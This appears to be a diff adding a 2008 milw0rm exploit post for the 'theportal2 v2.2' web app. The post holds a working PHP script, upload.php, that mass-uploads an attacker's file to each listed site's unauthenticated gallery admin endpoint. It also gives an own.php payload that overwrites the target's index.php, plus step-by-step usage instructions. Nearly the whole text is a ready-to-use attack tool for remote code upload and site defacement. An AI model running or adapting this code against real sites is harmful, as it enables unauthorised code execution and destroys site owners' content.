@@ -1,0 +1,76 @@
+[ web apps] theportal2 v2.2 (Auth bypass) file upload
+--------------------
+Author: siurek22
+-------------------- 
+
+You need curl to run it
+
+--------------------
+Code:
+--------------------
+upload.php
+
+
+<?php
+$file=$_POST['url'];
+$fel=explode("\n", $file);
+
+
+
+
+$ile=count($fel);
+if(empty($file))
+{
+ echo'<br><br><br>
+                                               <center>
+                                               <form method="post">
+                                               <textarea type="text" name="url" cols="50" rows="10"></textarea>
+                                               <input type="submit" value="OWNED">
+                                               </form>
+';
+}
+else{
+for($i=0; $i<$ile;$i++)
+{
+$url=$fel[$i];
+$url2=$url."/admin/galeria.php?akcja=dodaj_foto";
+$url5=$url."/galeria/own.php";
+                $c = curl_init();
+                $postFields['adres'] = '@' . dirname(__FILE__) . '/own.php';
+                $postFields['tytul'] = 'us';
+                $postFields['opis'] = 'us';
+                $postFields['kategoria'] = 1;
+                $postFields['B1'] = 'dodaj';
+                curl_setopt($c, CURLOPT_URL, $url2);
+                curl_setopt($c, CURLOPT_POST, 1);
+                curl_setopt($c, CURLOPT_POSTFIELDS, $postFields);
+                curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+                $odpowiedz3=curl_exec($c);
+
+                curl_close($c);
+}
+}              
+?>
+
+------------
+ „own.php” with your code php
+Example:
+
+<?php
+$text="<?php die(\"OWNED...\"); ?>";
+$adres=$_SERVER['SCRIPT_FILENAME'];
+$adres=str_replace("own.php","",$adres);
+$adres=substr($adres,0, -8);
+$adres=$adres."index.php";
+$fp=fopen($adres,"w");
+fwrite($fp, $text);
+fclose($fp);
+
+?>
+
+Example:
+1 Put upload.php and own.php at server
+2 Go to url yourserver.com/upload.php and put to the textarea adres of website and Click OWNED
+3 Now go to url your file target.com/galeria/own.php
+
+# milw0rm.com [2008-12-29]
